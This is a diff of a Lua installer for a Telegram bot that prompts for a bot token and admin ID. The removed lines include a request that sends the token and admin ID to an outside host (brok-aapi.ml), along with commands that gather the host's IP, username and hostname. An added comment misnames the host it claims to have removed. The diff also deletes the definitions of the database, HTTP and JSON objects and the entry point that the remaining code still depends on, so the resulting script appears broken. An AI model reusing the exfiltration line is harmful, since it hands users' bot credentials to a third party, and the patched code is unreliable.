@@ -1,16 +1,3 @@
-database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-serpent = dofile("./File_Libs/serpent.lua")
-JSON    = dofile("./File_Libs/dkjson.lua")
-json    = dofile("./File_Libs/JSON.lua")
-URL = dofile("./File_Libs/url.lua")
-https = require("ssl.https")
-http = require("socket.http")
-Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
 local AutoFiles_Write = function() 
 local Create_Info = function(Token,Sudo)  
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
@@ -27,6 +14,7 @@ Sudo = ]]..Sudo..[[
 ]])
 Write_Info_Sudo:close()
 end  
+
 if not database:get(Server_Done.."Token_Write") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
@@ -43,30 +31,43 @@ io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
+
 if not database:get(Server_Done.."UserSudo_Write") then
 print("\27[1;34mSend Your Id Sudo :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id="..Id)
-if res == 200 then
-muaed = json:decode(data)
-if muaed.Info.info == 'Is_Spam' then
-io.write('\n\27[1;31mSorry The Id Is Prohibited From The Source\n\27[0;39;49m')
-os.execute('lua start.lua')
-end ---ifBn
-if muaed.Info.info == 'Ok' then
-io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
-database:set(Server_Done.."UserSudo_Write",Id)
-end ---ifok
+    -- الحصول على التوكن من قاعدة البيانات
+    local bot_token = database:get(Server_Done.."Token_Write")
+    
+    if bot_token then
+        -- التحقق من صحة المعرف عن طريق طلب معلومات المستخدم من Telegram API مباشرة
+        local api_url = "https://api.telegram.org/bot" .. bot_token .. "/getChat?chat_id=" .. Id
+        local data, res = https.request(api_url)
+        
+        if res == 200 then
+            local decoded_data = json:decode(data)
+            -- إذا كان الحقل ok يساوي true فهذا يعني أن المعرف صحيح
+            if decoded_data and decoded_data.ok == true then
+                io.write('\n\27[1;31mThe Id Is Saved (Verified via Telegram API)\n\27[0;39;49m')
+                database:set(Server_Done.."UserSudo_Write",Id)
+            else
+                io.write('\n\27[1;31mSorry, The Id is not valid or the bot cannot message this user.\n\27[0;39;49m')
+            end
+        else
+            io.write('\n\27[1;31mFailed to verify Id. Please check your Token or Id.\n\27[0;39;49m')
+        end
+    else
+        io.write('\n\27[1;31mBot Token not found. Please re-enter your Token first.\n\27[0;39;49m')
+    end
 else
-io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
-end  ---ifid
-os.execute('lua start.lua')
-end ---ifnot
+    io.write('\n\27[1;31mThe Id was not Saved (Invalid format)\n\27[0;39;49m')
 end
+os.execute('lua start.lua')
+end
+
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://brok-aapi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
+-- تم إزالة الطلب الخارجي لـ black-source.tk تمامًا
 print("::Elvon::")
 local RunBot = io.open("Elvon", 'w')
 RunBot:write([[
@@ -98,18 +99,3 @@ database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Wri
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
-local function Load_File()  
-local f = io.open("./sudo.lua", "r")  
-if not f then   
-AutoFiles_Write()  
-var = true
-else   
-f:close()  
-database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
-sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
-var = false
-end  
-return var
-end
-Load_File()
